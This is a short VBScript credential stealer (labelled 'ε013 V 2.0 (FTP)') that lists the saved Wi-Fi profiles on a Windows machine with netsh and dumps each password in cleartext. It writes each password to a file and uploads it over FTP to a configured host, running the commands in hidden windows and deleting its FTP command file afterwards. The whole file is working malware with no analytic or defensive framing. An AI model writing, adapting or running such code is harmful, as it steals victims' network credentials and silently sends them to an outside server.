'//////////////////////////////////////////////
'//            ε013 V 2.0 (FTP)
'//          Jordan Dalcq - 0v3rl0w
'/////////////////////////////////////////////


'///////////////// HOST INFO //////////////////
HOST = "localhost"
USER = "admin"
PASS = "password"
'/////////////////////////////////////////////

Function GetOutput(command)
  Set Shell = Wscript.CreateObject("WScript.Shell")
  Set cmd = Shell.Exec("cmd /c  " & command)
  strOut = ""

  Do While Not cmd.StdOut.AtEndOfStream
    strOut = strOut & cmd.StdOut.ReadLine() & "\n"
  Loop
  GetOutput=strOut
End Function

Function saveIt(wifi, passwd)
  wifi = Replace(Replace(wifi, ">", "-"), "<", "-")
  Set objFSO=CreateObject("Scripting.FileSystemObject")
  Set objFile=objFSO.CreateTextFile(wifi & ".txt")
  objFile.Write(passwd)
  objFile.Close
End Function


Function createFTPInfo(username, password, wifiName)
    With CreateObject("Scripting.FileSystemObject").CreateTextFile("cmd.txt")
        .WriteLine "USER " & username 
        .WriteLine password 
        .WriteLine "send " & wifiName & ".txt"
        .WriteLine "quit"
        .Close 
    End With
End Function

Function sendIt(hostname)
    With CreateObject("WScript.Shell")
        .Run "%comspec% /c ftp -n -v -s:cmd.txt " & hostname, 0, True 
        .Run "%comspec% /c del cmd.txt", 0, True
    End With 
End Function

strText=Split(GetOutput("netsh wlan show profile"), "\n")

i = 0

For Each x in strText 
	If i > 8 And i < Ubound(strText)-1 Then
		Name = Split(x, ": ")(1)
        createFTPInfo USER, PASS, Name
		str=Split(GetOutput("netsh wlan show profile """ & Name & """ key=clear"), "\n")(32)
		passwd = Split(str, ": ")
		If Ubound(passwd) Then 
			saveIt Name, passwd(1)
            sendIt HOST
		End If
	End If
	i = i + 1
Next
